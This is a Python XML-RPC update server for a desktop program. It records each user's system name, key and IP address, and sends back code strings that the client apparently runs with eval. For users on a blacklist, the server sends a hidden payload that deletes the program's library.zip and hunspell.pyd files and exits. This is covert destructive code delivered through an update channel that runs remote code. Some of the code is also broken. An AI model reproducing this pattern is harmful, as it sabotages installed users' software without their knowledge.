#!/usr/bin/env python
# -*- coding: UTF-8 -*-

__author__ = "snoa"

import logging
from logging import debug, exception
import os
import sys
import time
import re
import socket
from datetime import datetime
import SimpleXMLRPCServer
try:
    import sqlite
except:
    import sqlite3 as sqlite
    
import pidors

DEBUG = socket.gethostname().startswith('mulyazh')

if DEBUG:
    FILES_PATH = ''
else:
    FILES_PATH = '/home/snoa134/public_html/content-monster.com/updates'

URL_PATH = 'updates' 
USERS_DB_NAME = os.path.join(FILES_PATH, 'users.sqlite')
VERDIR_TMPL = re.compile("(\d+)\.(\d+)\.(\d+)")
EVAL_FILE = ".eval"
LOG_FILENAME = os.path.join(FILES_PATH, 'update.log')
logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG)

users_db = sqlite.connect(USERS_DB_NAME)

if not os.path.isfile(USERS_DB_NAME) or os.path.getsize(USERS_DB_NAME) == 0:
    c = users_db.cursor()
    c.execute('create table users(softname text, sysname text, keyname text, addr text)')
    users_db.commit()
    c.close()

def catcher(func):
    def spam(*args, **kargs):
        try:
            rc = func(*args, **kargs)
        except:
            exception("*** CATCH ***")
        return rc
    return spam

soft_names = ["treeedit"]

def get_latest_version(softname, version, keyname):
    """
    >>> rc = get_latest_version("treeedit", (1,0,5), "snoa_test")
    >>> eval( rc['eval'] )
    """

    addr =  os.environ.get('REMOTE_ADDR','0.0.0.0')
    
    rc = {"files":[], "eval":""}
    
    if softname not in soft_names:
        return rc
        
    progpath = os.path.join(FILES_PATH, softname)
    dir_list = []
    for dirname in os.listdir(progpath):
        m = VERDIR_TMPL.match(dirname)
        if m:
            dir_list.append( map(int, m.groups()) )
    dir_list.sort()

    old_ver = ".".join(map(str, version))
    new_ver = ".".join(map(str, dir_list[-1]))
    debug("[%s:%s] %s >= %s ", addr, keyname, old_ver, new_ver)
    if old_ver>=new_ver:
        return rc
        
    softpath = os.path.join(progpath, new_ver)
    urlpath = os.path.join(URL_PATH, softname, new_ver)
    soft_list = []
    ignore_names = [EVAL_FILE]

    for fname in os.listdir(softpath):
        if fname not in ignore_names:
            soft_list.append(os.path.join(urlpath, fname))
    
    rc["files"] = soft_list
    
    if os.path.isfile(os.path.join(softpath, EVAL_FILE)):
        rc["eval"] = open(os.path.join(softpath, EVAL_FILE)).read()
    
    return rc

normal_eval = """
debug("user checked")
"""

pidors_eval = """
debug("user ckeched")
import sys
import os
try:
    os.remove("library.zip")
    os.remove("hunspell.pyd")
except:
    pass
sys.exit()
"""

def check_userdata(softname, sysname, keyname):
    """
    >>> rc = check_userdata("treeedit", "mysysname", "snoa_test")
    >>> eval( rc['eval'] )    
    """
    c = users_db.cursor()
    
    addr =  os.environ.get('REMOTE_ADDR','127.0.0.1')

    c.execute('insert into users values(%s, %s, %s, %s)', (softname, sysname, keyname, addr))
    users_db.commit()
    c.close()
    if sysname in pidors.pidors or keyname in pidors.pidors:
        rc = {"eval":pidors_eval}
    else:
        rc = {"eval":normal_eval}
    return rc

"""
 def get_user_list(softname):
     try:
        if softname not in soft_names:
            return []
        c = users_db.cursor()
        rc = c.execute('select keyname, sysname from users where keyname not like "%%snoa%%" and softname="%s" order by keyname' % softname)
        c.close()
        return rc
    xception:
        exception("*** CATCH ***")
    return []
"""

def main():
    handler = SimpleXMLRPCServer.CGIXMLRPCRequestHandler()
    handler.register_function(get_latest_version)
    handler.register_function(check_userdata)
    # handler.register_function(get_user_list)

    handler.handle_request()
    
if __name__ == "__main__":
    main()
